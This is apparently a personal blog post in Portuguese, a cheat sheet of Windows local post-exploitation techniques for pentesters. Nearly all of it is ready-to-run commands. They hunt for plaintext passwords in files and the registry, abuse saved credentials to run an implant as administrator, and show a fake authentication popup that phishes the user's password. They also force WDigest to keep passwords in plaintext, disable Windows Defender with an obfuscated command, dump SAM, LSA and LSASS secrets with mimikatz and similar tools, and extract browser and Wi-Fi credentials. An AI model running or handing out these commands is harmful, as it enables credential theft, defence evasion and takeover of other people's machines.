---
layout: post
title: windows post-exp
date: 2025-04-30
description: windows local post-exp
categories: windows
---



## Windows Desktop/Workstation Host Post-Exp
> ___

Post-Exp locamente, no contexto de estar sob controle de uma maquina (com shell ou logado com creds). Depois do acesso você precisa fazer recon localmente e seguir com a exploração para escalar privilégio.

- https://attack.mitre.org/techniques/T1087/001/


## Recon Stuff
> ___

- LPE https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html

- cmd commands https://book.hacktricks.wiki/en/windows-hardening/basic-cmd-for-pentesters.html

- ps commands https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/index.html



## Pegando passwords em cleartext 
> ___


#### Procurando senhas em plaintext

- lista todos os diretorios a partir do c:\
- ``` C:\> dir /b /a /s c:\ > output.txt ```
  - em um cenário real você faz download do arquivo para a attack machine e analisa "offline"

- Filtra por arquivos com nome "passw"
- ``` C:\> type output.txt | findstr /i passw ```

- No PS
- ``` get-childitem -path c:\ -recurse -force | select-object -expandproperty fullname > output.txt```

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir#examples


#### Nomes e Extenções de arquivos interessantes para verificar

- Extenções: install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .conf, ,ini, .xml, .txt, .gpg, .pgp, .p12, .der, .crs, .cer, id_rsa, id_dsa, .ovpn, vnc,
ftp, ssh, vpn, git, .kdbx, .db

- Arquivos: unattend.xml, Unattended.xml, sysprep.inf, sysprep.xml, VARIABLES.DAT, setupinfo, setupinfo.bak, web.config, SiteList.xml, .aws\credentials, .azure\accessTokens,json, .azure\azureProfile.json, gcloud\credentials.db, gcloud\legacy_credentials, gcloud\access_tokens.db

- ``` C:\> type output.txt | findstr /i algumas extenção ```



#### Arquivos nos Registries 

- ``` reg query HKLM /f password /t REG_SZ /s ```


- ``` reg query "HKCU\Software\ORL\WinVNC3\Passowrd" ```
 
- ``` reg query "HKCU\Software\TightVNC\Server" ```

- ``` reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" ```

- ``` reg query "HKCU\Software\SimonTatham\PuTTY\Sessions\local" ```



#### Abusing Credential Manager

- Credential Manager
  - O Credential Manager é uma espécie de cofre digital dentro do sistema Windows. O Windows armazena credenciais de registry, como usernames e senhas...

- Do ponto de vista do invasor, geralmente você não tem acesso a uma GUI... Então você usa a linha de comando. Na linha de comando existe uma ferramenta chamada "cmdkey".

  - O cmdkey também permite listar essas informações.
    - ``` C:\> cmdkey /list ```

- Podemos acessar o diretório inicial do administrador e executar processos como administrador:
  - ``` C:\> runas /user:administrator cmd.exe``` <===== precisa de admin pass

  - ``` C:\> runas /savedcred /user:administrator cmd.exe ```
    - windows vai até Credential Manager, verifica o usuário admin (consulta o banco de dados), extrai a senha do usuário admin e executa o processo. (execute como administrador com integrity level medium)

- Podemos listar todos os diretórios aos quais não temos acesso.
  - ``` C:\> runas /savedcred /user:administrator "c:\windows\system32\cmd.exe /c dir /b /a /s c:\users\administrator > c:\output-admin.txt" ```
    - em um cenário real você faz download do arquivo para a attack machine e analisa "offline"

- Também podemos usar esse comando para rodar um implant:
  - ``` C:\> runas /savedcred /user:administrator "c:\path\to\implant.exe" ```


#### Popup local para pegar as creds de um user

- Cria um popup que pede a senha do usuário atual

- ``` C:\> powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::Username,[Environment]::UserDomainName); $cred.getnetworkcredential().password" ```

- ``` C:\> powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'CHANGE THIS WITH OTHER USERNAME',[Environment]::UserDomainName); $cred.getnetworkcredential().password" ```


#### Forçando o WDigest a armazenar credenciais em plaintext

Como parte do WDigest authentication provider, as versões do Windows até 8 e 2012 costumavam armazenar credenciais de logon na memória em plaintext por padrão, o que não é mais o caso com versões mais recentes do Windows. 

Mas ainda é possível forçar o WDigest a armazenar os secrets em plaintext.


Então como fazer isso? A opção mais fácil é definir a resgistry key para colocar o senhas de volta no LSASS. Dentro do HKLM existe uma config  ```UseLogonCredential``` que, se definido como 0, armazenará as credenciais de volta na memória:

- ```reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 ```

- Pelo Empire pode ser assim:
```shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDige /v UseLogonCredential /t REG_DWORD /d 1 f```


O problema com esta configuração é que precisaremos que o usuário faça login novamente no sistema. Você pode forçar lock-screen, reboot ou logoff, para poder capturar credenciais em clear text. A maneira mais fácil é bloquear sua estação de trabalho:

- ```rundll32.exe user32.dll,LockWorkStation```

Depois de ativar a tela de bloqueio e fazer com que o alvo façam login novamente, podemos executar o Mimikatz e recuperar as senhas.

- ```sekurlsa::logonpasswords```


REFS: 
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext
- https://github.com/gentilkiwi/mimikatz/wiki


#### Disabling Windows Defender

- Stop Windows Defender from executing on Startup
```
powershell -command "$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA B'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x"
```

Disabling antivirus and anti-spyware protections via the HKLM\SOFTWARE\MICROSOFT\WINDOWS DEFENDER registry key and adding the value “*.exe” to the HKLM\SOFTWARE\MICROSOFT\WINDOWS DEFENDER\EXCLUSIONS\EXTENSIONS registry key.


> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f

```
schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f
schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenanca" /f
schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f
schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f

Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -DisableCatchupFullScan $True
```

- https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/#c06


#### Cheatsheet commands

- dump registry hives (admin access)

```
> reg save HKLM\SAM C:\path\to\output\sam.hiv
> reg save HKLM\SYSTEM C:\path\to\output\system.hiv
> reg save HKLM\SECURITY C:\path\to\output\security.hiv

impacket-secretsdump -sam C:\sam.hiv -system C:\system.hiv local

mimikatz # lsadump::sam /sam:C:\sam.hiv /system:C:\system.hiv
```

- Lsa Dump 

```
mimikatz # token::elevate lsadump::secrets


mimikatz # lsadump::secrets /system:C:\system.hiv /security:C:\security.hiv


impacket-secretsdump -security C:\security.hiv -system C:\system.hiv local
```

- Lsass Dump

```
- prodump (need admin access)

> procdump.exe -accepteula -ma lsass.exe C:\path\to\output

- comsvcs.dll (maybe need system access)

> rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\path\to\output

- nanodump

> nanodump.exe --write C:\path\to\output
> nanodump.exe --silent-process-exit C:\path\to\output

- dumpert

> Outflank-Dumpert.exe


- extract creds from dump file

> mimikatz # sekurlsa::minidump C:\path\to\dumpfile
> mimikatz # sekurlsa::logonpasswords
```

- Credential Manager

```
mimikatz # privilege::debug

mimikatz # sekurlsa::credman
```

- Chrome Decryption (Normal user context)
```mimikatz # dpapi::chrome /in:"C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect```

```mimikatz.exe "token::elevate" "lsadump::secrets" exit```


- wifi pass 

```netsh wlan show profile name=ESSID key=clear```



#### Scripts para recon e para extrait passwords da memória, navegadores e etc:


- Chrome, FireFox, Opera e mais https://github.com/AlessandroZ/LaZagne
  - ```Lazagne.exe browsers -firefox```
  - ```python firefox_decrypt.py C:\Users\USERNAME\AppData\Roaming\Mozilla\FireFox\Profiles\random-val.default```
  - ```Lazagne.exe wifi```
  - ```Lazagne.exe all```

- Mimikittenz (https://github.com/putterpanda/mimikittenz)

- Web Creds: https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1

- Windows Credentials: https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1

- Browser Data https://github.com/LimerBoy/Adamantium-Thief
  - https://github.com/moonD4rk/HackBrowserData

- histórico e cookies do navegador: https://github.com/sekirkity/BrowserGather 

- A tool SessionGopher (https://github.com/fireeye/SessionGopher) pode pegar hostnames e senhas salvas do WinSCP, PuTTY, SuperPuTTY, FileZilla, e Microsoft Remote Desktop.


#### Conforme eu for achando e testando tecnicas e tools novas vou atualizar aqui.

